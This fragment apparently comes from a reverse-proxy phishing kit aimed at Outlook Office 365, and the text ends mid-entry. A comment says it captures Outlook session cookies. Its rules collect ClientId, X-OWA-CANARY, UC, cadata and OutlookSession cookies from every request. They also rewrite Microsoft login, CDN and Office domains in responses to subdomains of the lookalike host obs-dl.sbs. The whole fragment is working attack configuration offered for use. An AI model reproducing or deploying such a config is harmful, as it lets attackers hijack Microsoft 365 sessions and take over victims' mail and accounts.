# ============================================================
# NEW: Outlook Office 365 - captures Outlook session cookies
# ============================================================
outlook.office365.com:
  to: "outlook.obs-dl.sbs"
  capture:
    - name: "outlook_client_id"
      method: "GET"
      path: ".*"
      engine: "cookie"
      find: "ClientId"
      from: "cookie"
      required: false

    - name: "outlook_canary"
      method: "GET"
      path: ".*"
      engine: "cookie"
      find: "X-OWA-CANARY"
      from: "cookie"
      required: false

    - name: "outlook_uc"
      method: "GET"
      path: ".*"
      engine: "cookie"
      find: "UC"
      from: "cookie"
      required: false

    - name: "outlook_cadata"
      method: "GET"
      path: ".*"
      engine: "cookie"
      find: "cadata"
      from: "cookie"
      required: false

    - name: "outlook_session"
      method: "GET"
      path: ".*"
      engine: "cookie"
      find: "OutlookSession"
      from: "cookie"
      required: false

  rewrite:
    - name: "rewrite_outlook365_domain"
      find: "outlook\\.office365\\.com"
      replace: "outlook.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_login_domain_in_outlook"
      find: "login\\.microsoftonline\\.com"
      replace: "obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_live_in_outlook"
      find: "login\\.live\\.com"
      replace: "live.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_loginmicrosoft_in_outlook"
      find: "login\\.microsoft\\.com"
      replace: "loginmicrosoft.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_office_in_outlook"
      find: "www\\.office\\.com"
      replace: "office.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_m365_in_outlook"
      find: "m365\\.cloud\\.microsoft"
      replace: "m365.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_aadcdn_in_outlook"
      find: "aadcdn\\.msftauth\\.net"
      replace: "aadcdn.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_logincdn_in_outlook"
      find: "logincdn\\.msftauth\\.net"
      replace: "logincdn.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_msauth_in_outlook"
      find: "aadcdn\\.msauth\\.net"
      replace: "msauth.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_account_live_in_outlook"
      find: "account\\.live\\.com"
      replace: "account-live.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_outlook_office_in_outlook"
      find: "outlook\\.office\\.com"
      replace: "outlook-office.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_substrate_in_outlook"
      find: "substrate\\.office\\.com"
